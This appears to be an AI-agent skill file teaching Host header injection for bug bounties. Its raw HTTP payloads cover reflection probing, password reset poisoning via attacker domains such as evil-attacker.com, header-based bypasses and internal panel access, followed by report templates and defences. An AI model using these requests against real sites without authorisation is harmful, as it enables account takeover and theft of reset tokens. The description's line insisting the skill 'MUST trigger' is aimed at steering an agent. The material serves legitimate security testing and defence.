---
name: host-header-injection-attacks
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Exploit insecure handling of the HTTP Host header to poison password resets, generate cache
  poisoning vectors, or bypass internal routing restrictions. Use this skill when web applications
  dynamically generate URLs, links, or redirects based on the arbitrary Host header value supplied
  by the client rather than relying on a static, trusted server configuration.
domain: cybersecurity
subdomain: bug-hunting
category: Web Vulnerabilities
difficulty: intermediate
estimated_time: "1-3 hours"
mitre_attack:
  tactics: [TA0001, TA0005]
  techniques: [T1190, T1566.002]
platforms: [linux, windows]
tags: [host-header, password-reset-poisoning, ssrf, cache-poisoning, web-vulnerabilities, routing-bypass]
tools: [burpsuite]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Host Header Injection Attacks

## When to Use
- When testing Password Reset functionalities that generate emails containing "click here" links.
- When an application performs HTTP 301/302 redirects back to its own domain based on the Host header.
- To bypass virtual host routing to access internal development servers (e.g., accessing an unlisted `admin.target.localhost`).
- To combine with Web Cache Poisoning to serve malicious absolute URLs to innocent users.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Probing for Reflection

```http
# Concept: The HTTP standard requires clients to supply a `Host` header indicating which 
# website they want to communicate with. If developers dynamically use this variable (e.g., `$_SERVER['HTTP_HOST']` in PHP) 
# instead of a static config, we can inject arbitrary domains.

# 1. Standard Request
GET /login HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
<link rel="stylesheet" href="https://target.com/style.css">

# 2. Injected Request (Modify the Host header)
GET /login HTTP/1.1
Host: evil-attacker.com

# 3. Analyze Response
HTTP/1.1 200 OK
<link rel="stylesheet" href="https://evil-attacker.com/style.css">

# CRITICAL VULNERABILITY: The server blindly trusted our Host header to generate absolute URLs!
```

### Phase 2: Exploiting Password Reset Poisoning (High Impact)

```http
# Concept: Password resets send an email to the victim containing a unique token. 
# If the link domain is generated via the Host header, the attacker intercepts the token.

# 1. Attacker requests a password reset for victim@company.com
POST /reset_password HTTP/1.1
Host: evil-attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@company.com

# 2. What happens on the backend:
# Server generates token `XYZ123`.
# Server constructs email: "Click here to reset: https://" + HTTP_HOST + "/reset?token=XYZ123"
# The backend emails the victim: "Click here to reset: https://evil-attacker.com/reset?token=XYZ123"

# 3. Execution:
# Victim receives legitimate email from `noreply@company.com`.
# Victim clicks the heavily disguised link.
# The victim's browser navigates to `evil-attacker.com/reset?token=XYZ123`.
# The attacker logs the token, navigates to `target.com/reset?token=XYZ123`, and changes the victim's password. Account Takeover!
```

### Phase 3: Bypassing Host Validation (X-Forwarded-Host)

```text
# Concept: Some servers strictly validate the Host header and will return a 400 Bad Request
# or route to a default 404 page if you change it. You must use alternative headers.

# Request A (Double Host headers - ambiguous routing)
GET /reset HTTP/1.1
Host: target.com
Host: evil.com

# Request B (Absolute URL Override)
GET https://evil.com/reset HTTP/1.1
Host: target.com

# Request C (X-Forwarded / Front-end proxy override)
# WAFs and proxies often trust X-Forwarded-Host overriding the standard Host header.
GET /reset HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
```

### Phase 4: Accessing Internal Administration Panels (SSRF-like Routing Bypass)

```text
# Concept: Suppose `target.com` uses a reverse proxy. Internal tools sit on `admin.target.internal`.
# If you send a request to the public IP but supply the internal Host header, the proxy might 
# route you to the internal server.

POST / HTTP/1.1
Host: localhost
# or
Host: admin.internal

# Response:
HTTP/1.1 200 OK
<h2>Welcome to the Employee Intranet</h2>

# You bypassed the external firewall and accessed an unrouted internal VLAN.
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Inject `Host: evil.com`] --> B{Does server respond with 200 OK?}
    B -->|Yes| C{Is evil.com reflected in the HTML response?}
    C -->|Yes| D[Test Password Reset Poisoning!]
    C -->|No| E[Test for Web Cache Poisoning]
    B -->|No (400/404/403)| F[Server validates Host header]
    F --> G[Inject `X-Forwarded-Host: evil.com`]
    G --> H{Reflected? If Yes -> Exploit}
```


### 🏆 Elite Chaining Strategy (Top 1% Hunter Methodology)

> **Core Principle**: A single finding is a $500 report. A chained exploit is a $50,000 report.
> The top 1% of hunters spend 40+ hours on a single target, understanding it better than
> the developers who built it. They automate discovery, not exploitation.

**Chaining Decision Tree:**
```mermaid
graph TD
    A[Finding Discovered] --> B{Severity?}
    B -->|Low/Info| C[Can it enable recon?]
    B -->|Medium| D[Can it escalate access?]
    B -->|High/Crit| E[Document + PoC immediately]
    C -->|Yes| F[Chain: InfoLeak → targeted attack]
    C -->|No| G[Log but deprioritize]
    D -->|Yes| H[Chain: Medium + Priv Esc = Critical]
    D -->|No| I[Submit standalone if impact clear]
    F --> J[Re-evaluate combined severity]
    H --> J
    E --> K[Test lateral movement potential]
    J --> L[Write consolidated report with full attack chain]
    K --> L
```

**Common High-Payout Chains:**
| Chain Pattern | Typical Bounty | Example |
|--|--|--|
| SSRF → Cloud Metadata → IAM Keys | $15,000-$50,000 | Webhook URL → AWS creds → S3 data |
| Open Redirect → OAuth Token Theft | $5,000-$15,000 | Login redirect → steal auth code |
| IDOR + GraphQL Introspection | $3,000-$10,000 | Enumerate users → access any account |
| Race Condition → Financial Impact | $10,000-$30,000 | Duplicate gift cards → unlimited funds |
| XSS → ATO via Cookie Theft | $2,000-$8,000 | Stored XSS on admin page → session hijack |
| Info Disclosure → API Key Reuse | $5,000-$20,000 | JS file → hardcoded API key → admin access |

**The "Architect" vs "Scanner" Mindset:**
- ❌ **Scanner Mindset**: Run nuclei on 10,000 subdomains, submit the first hit → duplicates
- ✅ **Architect Mindset**: Spend 2 weeks mapping ONE application's business logic, RBAC model, 
  and integration seams → find what no scanner ever will

## 🔵 Blue Team Detection & Defense
- **Absolute URLs**: Ensure web applications rely on a securely hardcoded configuration variable (e.g., `APP_URL="https://target.com"`) to define the base domain for all dynamic links, password reset emails, and redirects rather than dynamically evaluating the HTTP `Host` header.
- **Whitelist the Host Header**: Configure the web server (Nginx/Apache) to strictly validate the incoming `Host` header against a whitelist of expected top-level domains. If it does not match, return a `400 Bad Request` before the request is even passed to the backend application processing logic.
- **Drop Unsafe Proxy Headers**: If the application does not explicitly demand `X-Forwarded-Host` for CDN routing, strictly strip it at the edge load balancer.

## Key Concepts
| Concept | Description |
|---------|-------------|
| Host Header | A mandatory HTTP/1.1 header that specifies which website or domain the client wants to communicate with |
| Virtual Hosting | Running multiple websites on a single IP address, heavily relying on the Host header to route traffic to the correct backend folder |
| X-Forwarded-Host | A non-standard header used by load balancers and CDNs to inform the backend server what the original Host header requested by the client was |

## Output Format
```
Bug Bounty Report: Password Reset Poisoning leading to ATO
==========================================================
Vulnerability: Application Logic Flaw via Host Header Injection
Severity: Critical (CVSS 8.8)
Target: POST /auth/forgot_password

Description:
The target application dynamically constructs the password reset URL delivered via email by parsing the `Host` header supplied within the initial HTTP request. By manipulating the `Host` header to an attacker-controlled domain during the password reset initiation, the server emails the victim a malicious link containing their secure validity token. 

Reproduction Steps:
1. Initiate a password reset for the victim's email address.
2. Intercept the request and modify the `Host` header:
   POST /auth/forgot_password HTTP/1.1
   Host: attacker-log-server.com
3. Forward the request. 
4. The victim receives an official email from `support@target.com` containing the link: `https://attacker-log-server.com/auth/reset?token=SECRET_VALIDITY_TOKEN`.
5. Upon following the link, the token is recorded on the attacker's server, enabling instantaneous account takeover.

Impact:
Critical logic flaw allowing Account Takeover (ATO) requiring minor social engineering (the victim clicking a legitimate-looking email link).
```


### 📝 Elite Report Writing (Top 1% Standard)

> **"The difference between a $500 and $50,000 report is the quality of the writeup."**
> — Vickie Li, Bug Bounty Bootcamp

**Title Format**: `[VulnType] in [Component] Allows [BusinessImpact]`
- ❌ "XSS Found" → This tells the triager nothing
- ✅ "Stored XSS in /admin/comments Allows Session Hijacking of All Moderators"

**Report Structure (HackerOne-Optimized):**
1. **Summary** (2-4 sentences — triager reads only this first): What broke, how, worst-case.
2. **CVSS 4.0 Vector** — Must be defensible; wrong CVSS destroys credibility.
3. **Attack Scenario** — 3-5 sentence narrative from attacker's perspective.
4. **Impact** — MUST include at least one real number: "Affects 4.2M users" not "affects many users".
5. **Steps to Reproduce** — Deterministic. A junior dev who has never seen this bug reproduces it exactly.
6. **PoC** — Copy-paste runnable. No placeholders. Match the exact HTTP method.
7. **Remediation** — Don't say "sanitize input." Give the exact code fix, before/after.
8. **CWE + References** — SSRF→CWE-918, IDOR→CWE-639, SQLi→CWE-89, XSS→CWE-79.

**Pre-Report Verification (5 Checks):**
1. 🔍 **Hallucination Detector** — Verify endpoints, CVEs, and code paths are real
2. 🤖 **AI Writing Pattern Check** — Remove "Certainly!", "It's worth noting", generic phrasing
3. 🧪 **PoC Reproducibility** — Payload syntax valid for context? Prerequisites stated?
4. 📋 **Duplicate Detection** — Is this a scanner-generic finding? Known public disclosure?
5. 📈 **Impact Plausibility** — Severity matches technical capability? No inflation?



## 💰 Industry Bounty Payout Statistics (2024-2025)

| Company/Platform | Total Paid | Highest Single | Year |
|-----------------|------------|---------------|------|
| **Google VRP** | $17.1M | $250,000 (CVE-2025-4609 Chrome sandbox escape) | 2025 |
| **Microsoft** | $16.6M | (Not disclosed) | 2024 |
| **Google VRP** | $11.8M | $100,115 (Chrome MiraclePtr Bypass) | 2024 |
| **HackerOne (all programs)** | $81M | $100,050 (crypto firm) | 2025 |
| **Meta/Facebook** | $2.3M | up to $300K (mobile code execution) | 2024 |
| **Crypto.com (HackerOne)** | $2M program | $2M max | 2024 |
| **1Password (Bugcrowd)** | $1M max | $1M (highest Bugcrowd ever) | 2024 |
| **Samsung** | $1M max | $1M (critical mobile flaws) | 2025 |

**Key Takeaway**: Google alone paid $17.1M in 2025 — a 40% increase YoY. Microsoft paid $16.6M.
The industry is paying more, not less. Average critical bounty on HackerOne: $3,700 (2023).

## 🔴 Red Team
- Extract assets and enumerate endpoints.
- Execute initial payloads leveraging documented vulnerabilities.

## References
- PortSwigger: [HTTP Host header attacks](https://portswigger.net/web-security/host-header)
- OWASP: [Testing for Host Header Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection)
- PayloadsAllTheThings: [Host Header Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Host%20Header%20Injection)
